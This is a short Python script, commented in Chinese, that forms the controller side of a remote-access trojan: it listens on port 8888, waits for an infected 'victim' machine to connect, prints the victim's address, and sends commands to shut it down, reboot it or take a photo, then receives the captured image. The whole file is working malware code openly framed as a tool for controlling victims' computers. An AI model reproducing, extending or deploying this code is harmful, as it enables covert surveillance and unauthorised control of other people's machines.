# 后台是我们自己用的 控制受害者的电脑！
from socket import *

S = socket()                # 1.创建一个套接字
S.bind(('0.0.0.0', 8888))   # 2.套接字绑定一个网络地址
S.listen()                  # 3.套接字开启监听
s, addr = S.accept()        # 4.如果木马上线 申请连接后台！

print(addr)  # 打印看一下受害者的位置！
print('1.关机 2.重启 3.拍照')
choice = input('请选择:')
s.send(choice.encode())  # 把我们的选择发过去

if choice == '3':
    # 1.接收文件的大小 回复确认！
    file_size = int(s.recv(1024).decode())
    s.send('ojbk'.encode())

    # 2.准备一个空文件 一点一点的接收 写入新文件！
    cur_size = 0   # 刻度为0
    with open('2.png', 'wb') as file:
        while cur_size < file_size:
            data = s.recv(1024)
            file.write(data)
            cur_size += len(data)

